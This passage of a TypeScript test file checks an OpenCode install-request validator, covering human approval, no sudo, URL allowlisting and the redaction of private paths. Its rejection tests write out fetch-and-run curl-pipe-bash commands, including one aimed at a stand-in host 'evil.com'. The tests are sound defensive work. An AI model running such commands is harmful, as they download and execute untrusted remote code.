// Positron — OpenCode Provider Detection Tests (Issue #229 PR 6)
// ---------------------------------------------------------------------------
// Tests cover:
//   - Install request builder + validation
//   - Detection type validation
//   - Runtime readiness policy
//   - Evidence creation and redaction
//   - Runtime safety (no actual OpenCode execution)
//
// SECURITY: No test runs OpenCode with prompt, writes files via OpenCode,
// installs OpenCode, or downloads anything.

import { describe, test, expect } from 'vitest';
import {
	type OpenCodeDetectionStatus,
	type OpenCodeInstallStatus,
	type OpenCodeProviderRuntimeStatus,
	type OpenCodeBinaryDetection,
	type OpenCodeInstallRequest,
	type OpenCodeProviderDetectionEvidence,
	type RedactedOpenCodeProviderDetectionEvidence,
	ALL_OPENCODE_DETECTION_STATUSES,
	ALL_OPENCODE_INSTALL_STATUSES,
	ALL_OPENCODE_PROVIDER_RUNTIME_STATUSES,
	isOpenCodeDetectionStatus,
	isOpenCodeInstallStatus,
	isOpenCodeProviderRuntimeStatus,
	isOpenCodeBinaryDetection,
	isOpenCodeInstallRequest,
	isRedactedOpenCodeProviderDetectionEvidence,
	buildOpenCodeInstallRequest,
	validateOpenCodeInstallRequest,
	validateOpenCodeBinaryDetection,
	validateOpenCodeProviderDetectionEvidence,
	determineOpenCodeProviderRuntimeStatus,
	canOpenCodeProviderDemoRun,
	canOpenCodeProviderRealRun,
	getOpenCodeProviderBlockedReasons,
	createNotFoundDetection,
	createFoundDetection,
	createErrorDetection,
	createBlockedDetection,
	createOpenCodeProviderDetectionEvidence,
	redactOpenCodeProviderDetectionEvidence,
	DEFAULT_OPENCODE_INSTALL_DIR,
	OFFICIAL_OPENCODE_INSTALL_URL,
	OFFICIAL_OPENCODE_INSTALL_COMMAND,
	POSITRON_OPENCODE_INSTALL_COMMAND_TEMPLATE,
	CURL_PIPE_BASH_TRUST_WARNING,
	ALLOWLISTED_OPENCODE_INSTALL_URLS,
} from '../opencode-provider-detection.js';

// ═══════════════════════════════════════════════════════════════════════════════
// Helper factories
// ═══════════════════════════════════════════════════════════════════════════════

function makeDetection(overrides: Partial<OpenCodeBinaryDetection> = {}): OpenCodeBinaryDetection {
	return {
		binaryName: 'opencode',
		detectionStatus: 'version_checked',
		detectedPath: '/home/user/.positron/tools/bin/opencode',
		version: '1.2.3',
		helpAvailable: true,
		checkedAt: new Date().toISOString(),
		...overrides,
	};
}

function makeInstallRequest(overrides: Partial<OpenCodeInstallRequest> = {}): OpenCodeInstallRequest {
	return {
		...buildOpenCodeInstallRequest(),
		...overrides,
	};
}

function makeEvidence(overrides: Partial<OpenCodeProviderDetectionEvidence> = {}): OpenCodeProviderDetectionEvidence {
	return {
		evidenceId: 'ev-test-001',
		detectionStatus: 'version_checked',
		installStatus: 'installed',
		runtimeStatus: 'ready_for_demo',
		version: '1.2.3',
		helpAvailable: true,
		redactionApplied: false,
		secretsDetected: false,
		privatePathsDetected: true,
		blockedReasons: [],
		createdAt: new Date().toISOString(),
		...overrides,
	};
}

// ═══════════════════════════════════════════════════════════════════════════════
// Phase 2 — Detection Types
// ═══════════════════════════════════════════════════════════════════════════════

describe('OpenCode Detection Types', () => {
	describe('Constant arrays', () => {
		test('ALL_OPENCODE_DETECTION_STATUSES has 7 members', () => {
			expect(ALL_OPENCODE_DETECTION_STATUSES).toHaveLength(7);
		});

		test('ALL_OPENCODE_INSTALL_STATUSES has 6 members', () => {
			expect(ALL_OPENCODE_INSTALL_STATUSES).toHaveLength(6);
		});

		test('ALL_OPENCODE_PROVIDER_RUNTIME_STATUSES has 11 members', () => {
			expect(ALL_OPENCODE_PROVIDER_RUNTIME_STATUSES).toHaveLength(11);
		});
	});

	describe('Type guards — detection status', () => {
		test('valid detection status passes', () => {
			for (const status of ALL_OPENCODE_DETECTION_STATUSES) {
				expect(isOpenCodeDetectionStatus(status)).toBe(true);
			}
		});

		test('invalid detection status fails', () => {
			expect(isOpenCodeDetectionStatus('invalid')).toBe(false);
			expect(isOpenCodeDetectionStatus('')).toBe(false);
			expect(isOpenCodeDetectionStatus(null)).toBe(false);
			expect(isOpenCodeDetectionStatus(42)).toBe(false);
		});

		test('not_found status is safe (valid)', () => {
			expect(isOpenCodeDetectionStatus('not_found')).toBe(true);
		});

		test('error status is safe (valid)', () => {
			expect(isOpenCodeDetectionStatus('error')).toBe(true);
		});
	});

	describe('Type guards — install status', () => {
		test('valid install status passes', () => {
			for (const status of ALL_OPENCODE_INSTALL_STATUSES) {
				expect(isOpenCodeInstallStatus(status)).toBe(true);
			}
		});

		test('invalid install status fails', () => {
			expect(isOpenCodeInstallStatus('running')).toBe(false);
		});
	});

	describe('Type guards — runtime status', () => {
		test('valid runtime status passes', () => {
			for (const status of ALL_OPENCODE_PROVIDER_RUNTIME_STATUSES) {
				expect(isOpenCodeProviderRuntimeStatus(status)).toBe(true);
			}
		});
	});

	describe('isOpenCodeBinaryDetection', () => {
		test('valid detection object passes', () => {
			const d = makeDetection();
			expect(isOpenCodeBinaryDetection(d)).toBe(true);
		});

		test('null fails', () => {
			expect(isOpenCodeBinaryDetection(null)).toBe(false);
		});

		test('string fails', () => {
			expect(isOpenCodeBinaryDetection('not-an-object')).toBe(false);
		});

		test('wrong binaryName fails', () => {
			const d = makeDetection({ binaryName: 'not-opencode' as 'opencode' });
			expect(isOpenCodeBinaryDetection(d)).toBe(false);
		});

		test('invalid detectionStatus fails', () => {
			const d = makeDetection({ detectionStatus: 'invalid' as OpenCodeDetectionStatus });
			expect(d.detectionStatus).toBe('invalid');
			// Type guard should catch this
			const raw = { ...d, detectionStatus: 'invalid' };
			expect(isOpenCodeBinaryDetection(raw)).toBe(false);
		});

		test('missing helpAvailable fails', () => {
			const raw = { binaryName: 'opencode', detectionStatus: 'found', checkedAt: '2026-01-01T00:00:00Z' };
			expect(isOpenCodeBinaryDetection(raw)).toBe(false);
		});
	});

	describe('validateOpenCodeBinaryDetection', () => {
		test('valid detection passes validation', () => {
			const result = validateOpenCodeBinaryDetection(makeDetection());
			expect(result.valid).toBe(true);
			expect(result.errors).toEqual([]);
		});

		test('wrong binaryName fails validation', () => {
			const result = validateOpenCodeBinaryDetection({ binaryName: 'wrong', detectionStatus: 'not_found', helpAvailable: false, checkedAt: '2026-01-01T00:00:00Z' });
			expect(result.valid).toBe(false);
			expect(result.errors).toContainEqual(expect.stringContaining('binaryName'));
		});

		test('invalid detectionStatus fails', () => {
			const result = validateOpenCodeBinaryDetection({ binaryName: 'opencode', detectionStatus: 'made-up', helpAvailable: false, checkedAt: '2026-01-01T00:00:00Z' });
			expect(result.valid).toBe(false);
			expect(result.errors).toContainEqual(expect.stringContaining('detectionStatus'));
		});

		test('missing checkedAt fails', () => {
			const result = validateOpenCodeBinaryDetection({ binaryName: 'opencode', detectionStatus: 'not_found', helpAvailable: false, checkedAt: '' });
			expect(result.valid).toBe(false);
			expect(result.errors).toContainEqual(expect.stringContaining('checkedAt'));
		});

		test('rejects apiKey field', () => {
			const result = validateOpenCodeBinaryDetection({
				binaryName: 'opencode', detectionStatus: 'not_found', helpAvailable: false,
				checkedAt: '2026-01-01T00:00:00Z', apiKey: 'sk-secret',
			});
			expect(result.valid).toBe(false);
			expect(result.errors).toContainEqual(expect.stringContaining('apiKey'));
		});

		test('rejects token field', () => {
			const result = validateOpenCodeBinaryDetection({
				binaryName: 'opencode', detectionStatus: 'not_found', helpAvailable: false,
				checkedAt: '2026-01-01T00:00:00Z', token: 'secret123',
			});
			expect(result.valid).toBe(false);
			expect(result.errors).toContainEqual(expect.stringContaining('token'));
		});

		test('null input fails', () => {
			const result = validateOpenCodeBinaryDetection(null);
			expect(result.valid).toBe(false);
		});
	});
});

// ═══════════════════════════════════════════════════════════════════════════════
// Phase 3 — Safe Install Request Builder + Validation
// ═══════════════════════════════════════════════════════════════════════════════

describe('Install Request Builder', () => {
	test('buildOpenCodeInstallRequest returns official URL', () => {
		const req = buildOpenCodeInstallRequest();
		expect(req.officialUrl).toBe('https://opencode.ai/install');
	});

	test('install request requires human approval', () => {
		const req = buildOpenCodeInstallRequest();
		expect(req.requiresHumanApproval).toBe(true);
	});

	test('install request disallows sudo', () => {
		const req = buildOpenCodeInstallRequest();
		expect(req.sudoAllowed).toBe(false);
	});

	test('install request disallows auto-run', () => {
		const req = buildOpenCodeInstallRequest();
		expect(req.autoRunAllowed).toBe(false);
	});

	test('commandPreview contains OPENCODE_INSTALL_DIR', () => {
		const req = buildOpenCodeInstallRequest();
		expect(req.commandPreview).toContain('OPENCODE_INSTALL_DIR');
	});

	test('commandPreview uses https://opencode.ai/install', () => {
		const req = buildOpenCodeInstallRequest();
		expect(req.commandPreview).toContain('https://opencode.ai/install');
	});

	test('tool is always "opencode"', () => {
		const req = buildOpenCodeInstallRequest();
		expect(req.tool).toBe('opencode');
	});

	test('manualFallbackAvailable is true', () => {
		const req = buildOpenCodeInstallRequest();
		expect(req.manualFallbackAvailable).toBe(true);
	});

	test('trustWarning contains curl-pipe-bash risk', () => {
		const req = buildOpenCodeInstallRequest();
		expect(req.trustWarning).toContain('curl-pipe-bash');
	});

	test('custom installDir overrides default', () => {
		const req = buildOpenCodeInstallRequest({ installDir: '/custom/path' });
		expect(req.installDir).toBe('/custom/path');
		expect(req.commandPreview).toContain('/custom/path');
	});

	test('default installDir is $HOME/.positron/tools/bin', () => {
		const req = buildOpenCodeInstallRequest();
		expect(req.installDir).toBe(DEFAULT_OPENCODE_INSTALL_DIR);
	});
});

describe('Install Request Validation', () => {
	test('valid install request passes', () => {
		const req = buildOpenCodeInstallRequest();
		const result = validateOpenCodeInstallRequest(req);
		expect(result.valid).toBe(true);
		expect(result.errors).toEqual([]);
	});

	test('validation fails if sudoAllowed true', () => {
		const req = { ...buildOpenCodeInstallRequest(), sudoAllowed: true };
		const result = validateOpenCodeInstallRequest(req);
		expect(result.valid).toBe(false);
		expect(result.errors).toContainEqual(expect.stringContaining('sudoAllowed'));
	});

	test('validation fails if autoRunAllowed true', () => {
		const req = { ...buildOpenCodeInstallRequest(), autoRunAllowed: true };
		const result = validateOpenCodeInstallRequest(req);
		expect(result.valid).toBe(false);
		expect(result.errors).toContainEqual(expect.stringContaining('autoRunAllowed'));
	});

	test('validation fails if requiresHumanApproval false', () => {
		const req = { ...buildOpenCodeInstallRequest(), requiresHumanApproval: false };
		const result = validateOpenCodeInstallRequest(req);
		expect(result.valid).toBe(false);
		expect(result.errors).toContainEqual(expect.stringContaining('requiresHumanApproval'));
	});

	test('validation fails for non-allowlisted URL', () => {
		const req = { ...buildOpenCodeInstallRequest(), officialUrl: 'https://evil.com/install' };
		const result = validateOpenCodeInstallRequest(req);
		expect(result.valid).toBe(false);
		expect(result.errors).toContainEqual(expect.stringContaining('officialUrl'));
	});

	test('validation fails if commandPreview contains sudo', () => {
		const req = {
			...buildOpenCodeInstallRequest(),
			commandPreview: 'sudo OPENCODE_INSTALL_DIR="/tmp" curl -fsSL https://opencode.ai/install | bash',
		};
		const result = validateOpenCodeInstallRequest(req);
		expect(result.valid).toBe(false);
		expect(result.errors).toContainEqual(expect.stringContaining('sudo'));
	});

	test('validation fails if commandPreview missing OPENCODE_INSTALL_DIR', () => {
		const req = {
			...buildOpenCodeInstallRequest(),
			commandPreview: 'curl -fsSL https://opencode.ai/install | bash',
		};
		const result = validateOpenCodeInstallRequest(req);
		expect(result.valid).toBe(false);
		expect(result.errors).toContainEqual(expect.stringContaining('OPENCODE_INSTALL_DIR'));
	});

	test('validation fails if commandPreview has non-allowlisted URL', () => {
		const req = {
			...buildOpenCodeInstallRequest(),
			commandPreview: 'OPENCODE_INSTALL_DIR="/tmp" curl -fsSL https://evil.com/install | bash',
		};
		const result = validateOpenCodeInstallRequest(req);
		expect(result.valid).toBe(false);
		expect(result.errors).toContainEqual(expect.stringContaining('non-allowlisted URL'));
	});

	test('validation fails if installDir empty', () => {
		const req = { ...buildOpenCodeInstallRequest(), installDir: '' };
		const result = validateOpenCodeInstallRequest(req);
		expect(result.valid).toBe(false);
		expect(result.errors).toContainEqual(expect.stringContaining('installDir'));
	});

	test('validation fails for null input', () => {
		const result = validateOpenCodeInstallRequest(null);
		expect(result.valid).toBe(false);
	});

	test('validation fails for string input', () => {
		const result = validateOpenCodeInstallRequest('not-an-object');
		expect(result.valid).toBe(false);
	});

	test('validation fails if networkRequired is false', () => {
		const req = { ...buildOpenCodeInstallRequest(), networkRequired: false };
		const result = validateOpenCodeInstallRequest(req);
		expect(result.valid).toBe(false);
		expect(result.errors).toContainEqual(expect.stringContaining('networkRequired'));
	});

	test('validation fails if manualFallbackAvailable is false', () => {
		const req = { ...buildOpenCodeInstallRequest(), manualFallbackAvailable: false };
		const result = validateOpenCodeInstallRequest(req);
		expect(result.valid).toBe(false);
		expect(result.errors).toContainEqual(expect.stringContaining('manualFallbackAvailable'));
	});

	test('validation fails if tool is not "opencode"', () => {
		const req = { ...buildOpenCodeInstallRequest(), tool: 'other-tool' };
		const result = validateOpenCodeInstallRequest(req);
		expect(result.valid).toBe(false);
		expect(result.errors).toContainEqual(expect.stringContaining('tool'));
	});
});

describe('isOpenCodeInstallRequest type guard', () => {
	test('valid install request passes', () => {
		expect(isOpenCodeInstallRequest(buildOpenCodeInstallRequest())).toBe(true);
	});

	test('sudoAllowed true fails', () => {
		expect(isOpenCodeInstallRequest({ ...buildOpenCodeInstallRequest(), sudoAllowed: true })).toBe(false);
	});

	test('autoRunAllowed true fails', () => {
		expect(isOpenCodeInstallRequest({ ...buildOpenCodeInstallRequest(), autoRunAllowed: true })).toBe(false);
	});

	test('null fails', () => {
		expect(isOpenCodeInstallRequest(null)).toBe(false);
	});
});

// ═══════════════════════════════════════════════════════════════════════════════
// Phase 4 — Detection Factory Functions
// ═══════════════════════════════════════════════════════════════════════════════

describe('Detection Factory Functions', () => {
	test('createNotFoundDetection returns not_found status', () => {
		const d = createNotFoundDetection();
		expect(d.detectionStatus).toBe('not_found');
		expect(d.binaryName).toBe('opencode');
		expect(d.helpAvailable).toBe(false);
		expect(d.checkedAt).toEqual(expect.any(String));
	});

	test('createFoundDetection with version returns version_checked', () => {
		const d = createFoundDetection('/path/to/opencode', '1.2.3');
		expect(d.detectionStatus).toBe('version_checked');
		expect(d.version).toBe('1.2.3');
		expect(d.detectedPath).toBe('/path/to/opencode');
	});

	test('createFoundDetection with help only returns help_checked', () => {
		const d = createFoundDetection('/path/to/opencode', undefined, true);
		expect(d.detectionStatus).toBe('help_checked');
		expect(d.helpAvailable).toBe(true);
	});

	test('createFoundDetection without version/help returns found', () => {
		const d = createFoundDetection('/path/to/opencode');
		expect(d.detectionStatus).toBe('found');
	});

	test('createErrorDetection returns error status', () => {
		const d = createErrorDetection('Something went wrong');
		expect(d.detectionStatus).toBe('error');
		expect(d.errorMessage).toBe('Something went wrong');
	});

	test('createBlockedDetection returns blocked status', () => {
		const d = createBlockedDetection('Blocked by policy');
		expect(d.detectionStatus).toBe('blocked');
		expect(d.errorMessage).toBe('Blocked by policy');
	});
});

// ═══════════════════════════════════════════════════════════════════════════════
// Phase 5 — Provider Runtime Readiness Helpers
// ═══════════════════════════════════════════════════════════════════════════════

describe('determineOpenCodeProviderRuntimeStatus', () => {
	const gates = {
		modelProfileReady: true,
		specKitSynced: true,
		mcpWarmupPass: true,
		humanApprovedForRealRun: false,
	};

	test('blocked detection → blocked', () => {
		const result = determineOpenCodeProviderRuntimeStatus({
			detection: makeDetection({ detectionStatus: 'blocked' }),
			...gates,
		});
		expect(result).toBe('blocked');
	});

	test('error detection → not_ready', () => {
		const result = determineOpenCodeProviderRuntimeStatus({
			detection: makeDetection({ detectionStatus: 'error' }),
			...gates,
		});
		expect(result).toBe('not_ready');
	});

	test('not_found → detect_only', () => {
		const result = determineOpenCodeProviderRuntimeStatus({
			detection: makeDetection({ detectionStatus: 'not_found' }),
			...gates,
		});
		expect(result).toBe('detect_only');
	});

	test('unknown → detect_only', () => {
		const result = determineOpenCodeProviderRuntimeStatus({
			detection: makeDetection({ detectionStatus: 'unknown' }),
			...gates,
		});
		expect(result).toBe('detect_only');
	});

	test('found → install_request_ready', () => {
		const result = determineOpenCodeProviderRuntimeStatus({
			detection: makeDetection({ detectionStatus: 'found', version: undefined }),
			...gates,
		});
		expect(result).toBe('install_request_ready');
	});

	test('version_checked + no model profile → model_profile_required', () => {
		const result = determineOpenCodeProviderRuntimeStatus({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			modelProfileReady: false,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApprovedForRealRun: false,
		});
		expect(result).toBe('model_profile_required');
	});

	test('version_checked + no Spec Kit sync → speckit_sync_required', () => {
		const result = determineOpenCodeProviderRuntimeStatus({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			modelProfileReady: true,
			specKitSynced: false,
			mcpWarmupPass: true,
			humanApprovedForRealRun: false,
		});
		expect(result).toBe('speckit_sync_required');
	});

	test('version_checked + no MCP warm-up → mcp_warmup_required', () => {
		const result = determineOpenCodeProviderRuntimeStatus({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: false,
			humanApprovedForRealRun: false,
		});
		expect(result).toBe('mcp_warmup_required');
	});

	test('all gates + human approved → ready_for_real', () => {
		const result = determineOpenCodeProviderRuntimeStatus({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApprovedForRealRun: true,
		});
		expect(result).toBe('ready_for_real');
	});

	test('all gates no human approval → ready_for_demo', () => {
		const result = determineOpenCodeProviderRuntimeStatus({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApprovedForRealRun: false,
		});
		expect(result).toBe('ready_for_demo');
	});

	test('help_checked is treated as verified', () => {
		const result = determineOpenCodeProviderRuntimeStatus({
			detection: makeDetection({ detectionStatus: 'help_checked', version: undefined }),
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApprovedForRealRun: false,
		});
		expect(result).toBe('ready_for_demo');
	});
});

describe('canOpenCodeProviderDemoRun', () => {
	test('not_found blocks demo', () => {
		expect(canOpenCodeProviderDemoRun({
			detection: makeDetection({ detectionStatus: 'not_found' }),
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
		})).toBe(false);
	});

	test('found but no model profile blocks demo', () => {
		expect(canOpenCodeProviderDemoRun({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			modelProfileReady: false,
			specKitSynced: true,
			mcpWarmupPass: true,
		})).toBe(false);
	});

	test('found but no Spec Kit sync blocks demo', () => {
		expect(canOpenCodeProviderDemoRun({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			modelProfileReady: true,
			specKitSynced: false,
			mcpWarmupPass: true,
		})).toBe(false);
	});

	test('found but no MCP warm-up blocks demo', () => {
		expect(canOpenCodeProviderDemoRun({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: false,
		})).toBe(false);
	});

	test('found + model + sync + warm-up allows demo', () => {
		expect(canOpenCodeProviderDemoRun({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
		})).toBe(true);
	});

	test('blocked detection blocks demo', () => {
		expect(canOpenCodeProviderDemoRun({
			detection: makeDetection({ detectionStatus: 'blocked' }),
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
		})).toBe(false);
	});

	test('only found (not verified) blocks demo', () => {
		expect(canOpenCodeProviderDemoRun({
			detection: makeDetection({ detectionStatus: 'found' }),
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
		})).toBe(false);
	});

	test('error detection blocks demo', () => {
		expect(canOpenCodeProviderDemoRun({
			detection: makeDetection({ detectionStatus: 'error' }),
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
		})).toBe(false);
	});
});

describe('canOpenCodeProviderRealRun', () => {
	test('real run requires human approval', () => {
		expect(canOpenCodeProviderRealRun({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApproved: false,
		})).toBe(false);
	});

	test('real run without human approval blocks', () => {
		expect(canOpenCodeProviderRealRun({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApproved: false,
		})).toBe(false);
	});

	test('all gates + human approval allows real run', () => {
		expect(canOpenCodeProviderRealRun({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApproved: true,
		})).toBe(true);
	});

	test('human approval alone insufficient without model profile', () => {
		expect(canOpenCodeProviderRealRun({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			modelProfileReady: false,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApproved: true,
		})).toBe(false);
	});

	test('not_found blocks real run', () => {
		expect(canOpenCodeProviderRealRun({
			detection: makeDetection({ detectionStatus: 'not_found' }),
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApproved: true,
		})).toBe(false);
	});

	test('blocked blocks real run even with approval', () => {
		expect(canOpenCodeProviderRealRun({
			detection: makeDetection({ detectionStatus: 'blocked' }),
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApproved: true,
		})).toBe(false);
	});
});

describe('getOpenCodeProviderBlockedReasons', () => {
	test('not_found lists install needed reason', () => {
		const reasons = getOpenCodeProviderBlockedReasons({
			detection: makeDetection({ detectionStatus: 'not_found' }),
			installStatus: 'not_requested',
			modelProfileReady: false,
			specKitSynced: false,
			mcpWarmupPass: false,
			humanApprovedForRealRun: false,
		});
		expect(reasons).toContain('OpenCode binary not found');
		expect(reasons).toContain('OpenCode install has not been requested');
	});

	test('install approval missing is listed', () => {
		const reasons = getOpenCodeProviderBlockedReasons({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			installStatus: 'approval_required',
			modelProfileReady: false,
			specKitSynced: false,
			mcpWarmupPass: false,
			humanApprovedForRealRun: false,
		});
		expect(reasons).toContain('OpenCode installation requires human approval');
	});

	test('model profile missing is listed', () => {
		const reasons = getOpenCodeProviderBlockedReasons({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			installStatus: 'installed',
			modelProfileReady: false,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApprovedForRealRun: false,
		});
		expect(reasons).toContain('No active model profile configured');
	});

	test('spec kit sync missing is listed', () => {
		const reasons = getOpenCodeProviderBlockedReasons({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			installStatus: 'installed',
			modelProfileReady: true,
			specKitSynced: false,
			mcpWarmupPass: true,
			humanApprovedForRealRun: false,
		});
		expect(reasons).toContain('Spec Kit is not synchronized with provider profile');
	});

	test('mcp warm-up missing is listed', () => {
		const reasons = getOpenCodeProviderBlockedReasons({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			installStatus: 'installed',
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: false,
			humanApprovedForRealRun: false,
		});
		expect(reasons).toContain('MCP warm-up has not passed');
	});

	test('human approval missing is listed', () => {
		const reasons = getOpenCodeProviderBlockedReasons({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			installStatus: 'installed',
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApprovedForRealRun: false,
		});
		expect(reasons).toContain('Human approval required for real (production) runs');
	});

	test('all green returns empty reasons', () => {
		const reasons = getOpenCodeProviderBlockedReasons({
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			installStatus: 'installed',
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApprovedForRealRun: true,
		});
		expect(reasons).toEqual([]);
	});

	test('blocked detection explains reason', () => {
		const reasons = getOpenCodeProviderBlockedReasons({
			detection: makeDetection({ detectionStatus: 'blocked', errorMessage: 'Policy violation' }),
			installStatus: 'blocked',
			modelProfileReady: false,
			specKitSynced: false,
			mcpWarmupPass: false,
			humanApprovedForRealRun: false,
		});
		expect(reasons).toContain('OpenCode provider is blocked');
		expect(reasons).toContain('Block reason: Policy violation');
	});
});

// ═══════════════════════════════════════════════════════════════════════════════
// Phase 6 — Evidence Redaction
// ═══════════════════════════════════════════════════════════════════════════════

describe('Evidence Redaction', () => {
	test('redacted evidence excludes detectedPath', () => {
		const evidence = makeEvidence({ detectedPath: '/home/user/.positron/tools/bin/opencode' });
		const redacted = redactOpenCodeProviderDetectionEvidence(evidence);

		expect(redacted.redactionApplied).toBe(true);
		expect((redacted as unknown as Record<string, unknown>).detectedPath).toBeUndefined();
	});

	test('redacted evidence excludes private installDir path', () => {
		const evidence = makeEvidence({
			installRequest: buildOpenCodeInstallRequest({ installDir: '/home/user/private/tools/bin' }),
		});
		const redacted = redactOpenCodeProviderDetectionEvidence(evidence);

		expect(redacted.installRequest).toBeDefined();
		expect(redacted.installRequest!.commandPreview).toContain('$HOME/.positron/tools/bin');
		// The private path should be normalized away
		expect(redacted.installRequest!.commandPreview).not.toContain('/home/user/private');
	});

	test('redacted evidence preserves official URL', () => {
		const evidence = makeEvidence({
			installRequest: buildOpenCodeInstallRequest(),
		});
		const redacted = redactOpenCodeProviderDetectionEvidence(evidence);

		expect(redacted.installRequest!.officialUrl).toBe('https://opencode.ai/install');
	});

	test('redacted evidence preserves commandPreview (normalized)', () => {
		const evidence = makeEvidence({
			installRequest: buildOpenCodeInstallRequest(),
		});
		const redacted = redactOpenCodeProviderDetectionEvidence(evidence);

		expect(redacted.installRequest!.commandPreview).toContain('curl -fsSL');
		expect(redacted.installRequest!.commandPreview).toContain('https://opencode.ai/install');
	});

	test('redacted evidence preserves blocked reasons', () => {
		const evidence = makeEvidence({ blockedReasons: ['No model profile', 'MCP warm-up failed'] });
		const redacted = redactOpenCodeProviderDetectionEvidence(evidence);

		expect(redacted.blockedReasons).toEqual(['No model profile', 'MCP warm-up failed']);
	});

	test('redacted evidence keeps secretsDetected flag', () => {
		const evidence = makeEvidence({ secretsDetected: true });
		const redacted = redactOpenCodeProviderDetectionEvidence(evidence);

		expect(redacted.secretsDetected).toBe(true);
	});

	test('redacted evidence keeps privatePathsDetected flag', () => {
		const evidence = makeEvidence({ privatePathsDetected: true });
		const redacted = redactOpenCodeProviderDetectionEvidence(evidence);

		expect(redacted.privatePathsDetected).toBe(true);
	});

	test('redacted evidence marks redactionApplied true', () => {
		const evidence = makeEvidence({ redactionApplied: false });
		const redacted = redactOpenCodeProviderDetectionEvidence(evidence);

		expect(redacted.redactionApplied).toBe(true);
	});

	test('redacted evidence preserves version', () => {
		const evidence = makeEvidence({ version: '1.2.3' });
		const redacted = redactOpenCodeProviderDetectionEvidence(evidence);

		expect(redacted.version).toBe('1.2.3');
	});

	test('redacted evidence preserves helpAvailable', () => {
		const evidence = makeEvidence({ helpAvailable: true });
		const redacted = redactOpenCodeProviderDetectionEvidence(evidence);

		expect(redacted.helpAvailable).toBe(true);
	});

	test('redacted evidence preserves evidenceId', () => {
		const evidence = makeEvidence({ evidenceId: 'ev-test-001' });
		const redacted = redactOpenCodeProviderDetectionEvidence(evidence);

		expect(redacted.evidenceId).toBe('ev-test-001');
	});

	test('redacted evidence preserves createdAt', () => {
		const evidence = makeEvidence({ createdAt: '2026-06-15T12:00:00Z' });
		const redacted = redactOpenCodeProviderDetectionEvidence(evidence);

		expect(redacted.createdAt).toBe('2026-06-15T12:00:00Z');
	});

	test('redacted evidence preserves status fields', () => {
		const evidence = makeEvidence({
			detectionStatus: 'version_checked',
			installStatus: 'installed',
			runtimeStatus: 'ready_for_demo',
		});
		const redacted = redactOpenCodeProviderDetectionEvidence(evidence);

		expect(redacted.detectionStatus).toBe('version_checked');
		expect(redacted.installStatus).toBe('installed');
		expect(redacted.runtimeStatus).toBe('ready_for_demo');
	});

	test('redacted evidence without installRequest works', () => {
		const evidence = makeEvidence({ installRequest: undefined });
		const redacted = redactOpenCodeProviderDetectionEvidence(evidence);

		expect(redacted.installRequest).toBeUndefined();
	});

	test('isRedactedOpenCodeProviderDetectionEvidence rejects evidence with detectedPath', () => {
		// Evidence WITH detectedPath should fail the redacted type guard
		const evidence = makeEvidence({ detectedPath: '/private/path/to/opencode' });
		expect(isRedactedOpenCodeProviderDetectionEvidence(evidence)).toBe(false);

		const redacted = redactOpenCodeProviderDetectionEvidence(evidence);
		expect(isRedactedOpenCodeProviderDetectionEvidence(redacted)).toBe(true);
	});

	test('isRedactedOpenCodeProviderDetectionEvidence accepts evidence without detectedPath', () => {
		// Evidence without detectedPath property passes the redacted type guard
		// Create evidence with detectedPath first, then remove it
		const evidenceWithPath = makeEvidence({ detectedPath: '/some/path' });
		const { detectedPath: _removed, ...evidence } = evidenceWithPath;
		expect('detectedPath' in evidence).toBe(false);
		expect(isRedactedOpenCodeProviderDetectionEvidence(evidence)).toBe(true);
	});

	test('redacted type does not contain apiKey/token/secret fields', () => {
		const evidence = makeEvidence();
		const redacted = redactOpenCodeProviderDetectionEvidence(evidence);
		const raw = redacted as unknown as Record<string, unknown>;

		expect('apiKey' in raw).toBe(false);
		expect('token' in raw).toBe(false);
		expect('secret' in raw).toBe(false);
	});
});

// ═══════════════════════════════════════════════════════════════════════════════
// Evidence Creation + Validation
// ═══════════════════════════════════════════════════════════════════════════════

describe('createOpenCodeProviderDetectionEvidence', () => {
	test('creates evidence with correct detection status', () => {
		const evidence = createOpenCodeProviderDetectionEvidence({
			evidenceId: 'ev-001',
			detection: makeDetection({ detectionStatus: 'version_checked' }),
			installStatus: 'installed',
			modelProfileReady: true,
